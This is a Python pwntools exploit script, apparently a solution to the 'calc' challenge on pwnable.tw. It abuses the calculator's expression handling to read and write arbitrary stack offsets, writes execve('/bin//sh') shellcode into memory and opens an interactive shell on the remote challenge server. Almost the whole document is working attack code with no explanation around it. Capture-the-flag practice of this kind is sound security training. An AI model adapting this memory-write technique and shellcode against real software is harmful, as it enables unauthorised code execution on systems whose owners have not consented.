#!/bin/python

from pwn import *

local = True

debug_script = """b calc
c"""

if local:
    r = process("./calc")
    gdb.attach(r,debug_script)
else:
    r = remote("chall.pwnable.tw", 10100)


def read_mem(offset):
    r.send(b"+" + str(offset).encode("ascii") + b"\n")
    return int(r.readline()[:-1].decode('ascii'))

def get_writer(offset,value):
    value = u32(value)
    current_val = read_mem(offset)
    return "+{offset}{value_to_add:+d}\n".format(offset=offset,value_to_add=(value-current_val)).encode('ascii')


def write_mem(offset,value):
    string = get_writer(offset,value)
    print(string)
    r.send(string)
    result = r.readline()[:-1].decode("ascii")
    print(result)
    return result

print(r.readuntil("==\n").decode())


shellcode = """
xor eax, eax
push eax
push 0x68732f6e
push 0x69622f2f
mov ebx, esp
xor ecx, ecx
mov edx, ecx
mov eax, 0xb
int 0x80
""" 

shellcode = asm(shellcode)

for offset, i in enumerate(range(int(len(shellcode)/4))):
    write_mem(361+offset,shellcode[4*i:4*(i+1)])

r.sendline("")

r.interactive()
